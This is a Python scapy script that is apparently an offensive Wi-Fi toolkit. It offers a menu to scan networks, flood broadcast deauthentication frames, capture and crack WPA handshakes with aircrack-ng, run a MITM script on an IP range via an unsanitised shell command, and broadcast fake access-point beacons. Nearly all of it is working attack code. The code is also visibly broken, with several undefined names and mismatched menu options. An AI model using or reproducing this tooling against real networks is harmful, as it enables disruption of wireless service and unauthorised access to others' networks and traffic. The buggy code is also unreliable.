import audit
import os
import time
from scapy.all import *

# Monitor mode interface
interface = "wlan0mon"

# Global variables for selected network and client
selected_ap_mac = None
selected_ap_essid = None

networks = {} 

def scan_networks():
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            stats = packet[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            signal = packet.dBm_AntSignal
            rates = stats.get("rates")
            crypto = stats.get("crypto")

            if bssid not in networks:
                networks[bssid] = {
                    "SSID": ssid,
                    "Signal": signal,
                    "Channel": channel,
                    "Rates": rates,
                    "Crypto": crypto
                }

    sniff(prn=packet_handler, iface=interface, timeout=10)

    for bssid, network in networks.items():
        print(f"Network SSID      : {network['SSID']}")
        print(f"BSSID             : {bssid}")
        print(f"Signal Strength   : {network['Signal']} dBm")
        print(f"Channel           : {network['Channel']}")
        print(f"Crypto            : {network['Crypto']}")
        print(f"Supported Rates   : {' '.join(map(str, network['Rates']))} Mbps")
        print("")

# Function to select a network
def select_network():
    if not networks:
        print("[-] No networks found. Run a scan first (Option 1).")
        return False

    print("\n[*] Available Networks:")
    for idx, (bssid, essid) in enumerate(networks.items(), start=1):
        print(f"{idx}. {essid} ({bssid})")

    try:
        choice = int(input("Select a network (1-{}): ".format(len(networks))))
        selected_bssid = list(networks.keys())[choice - 1]
        selected_essid = networks[selected_bssid]

        global selected_ap_mac, selected_ap_essid
        selected_ap_mac = selected_bssid
        selected_ap_essid = selected_essid
        print(f"[*] Selected {selected_ap_essid} ({selected_ap_mac}).")
        return True
    except (ValueError, IndexError):
        print("[-] Invalid selection.")
        return False

## attacks
def send_deauth_frames(ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
    print(f"[*] Sending deauth frames to {ap_mac} targeting {client_mac}...")
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    for _ in range(count):
        sendp(packet, iface=interface, inter=0.1, verbose=False)
    print(f"[*] Sent {count} deauth frames.")

# Function to perform MITM attack
def mitm_attack():
    ip_range = input("Enter the IP range for MITM attack (e.g., 10.0.0.0/24): ")
    command = f"sudo python3 mitm.py -ip_range {ip_range}"
    print(f"[*] Running MITM attack on {ip_range}...")
    os.system(command)

# Function to create fake APs
def create_fake_ap(iface, ssid, duration):
    sender_mac = RandMAC()

    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    # Start time
    start_time = time.time()
    print(f"[+] Sending beacon frames for SSID '{ssid}' on interface '{iface}' for {duration} seconds...")
    # Send the frame in layer 2 every 100 milliseconds
    try:
        while time.time() - start_time < duration:
            sendp(frame, inter=0.1, iface=iface, verbose=1, count=1)
    except KeyboardInterrupt:
        print("\n[!] Sending interrupted by user.")
    finally:
        print("[+] Done sending beacon frames.")


def capture_handshake():
    if not selected_ap_mac:
        print("[-] No network selected. Please select one first.")
        return

    channel = networks[selected_ap_mac]['Channel']
    print("[*] Listening for WPA handshake...")
    os.system(f"airodump-ng -bssid {bssid} --channel {channel} --write wpa_handshake {interface}")
    time.sleep(10)  # Capture for 10 seconds
    os.system("pkill airodump-ng")
    print(f"[*] Handshake saved as handshake-01.cap.")

# Function to check for a valid handshake
def check_handshake():
    print("[*] Checking for handshake...")
    result = os.system(f"aircrack-ng handshake-01.cap")
    if result == 0:
        print("[+] Handshake captured successfully!")
        return True
    else:
        print("[-] No handshake detected.")
        return False

# Function to crack handshake using aircrack-ng
def crack_handshake():
    print("[*] Cracking handshake using aircrack-ng...")
    os.system(f"aircrack-ng handshake-01.cap -w {wordlist_path}")
    print("[*] Cracking attempt finished.")


def offensive_menu():
    global networks
    while True:
        print("Offensive Options:")
        print("1. Scan Networks")
        print("2. Deauth and Capture Handshake")
        print("3. Crack Handshake")
        print("4. MITM Attack")
        print("5. Create Fake APs")

        choice = input("Select an option (1-5): ")
        if choice == '1':
            networks = attack.scan_networks()
        elif choice == '2':
            if select_network():
                send_deauth_frames(selected_ap_mac)
                capture_handshake()
                check_handshake()
        elif choice == '3':
            crack_handshake()
        elif choice == '4':
            mitm_attack()
        elif choice == '5':
            create_fake_aps()
        elif choice == '6':
            audit.scan_networks()
            audit.audit_networks()
        elif choice == '7':
            break
            
        
        else:
            print("Invalid choice.")

def main_menu():
    while True:
        print("Select Mode:")
        print("1. Offensive")
        print("2. Exit")
    
        mode = input("Enter choice (1/2): ")
    
        if mode == '1':
            offensive_menu()
        elif mode == '2':
            print("Exiting...")
            exit()
        else:
            print("Invalid option.")
            main_menu()

if __name__ == "__main__":
    main_menu()
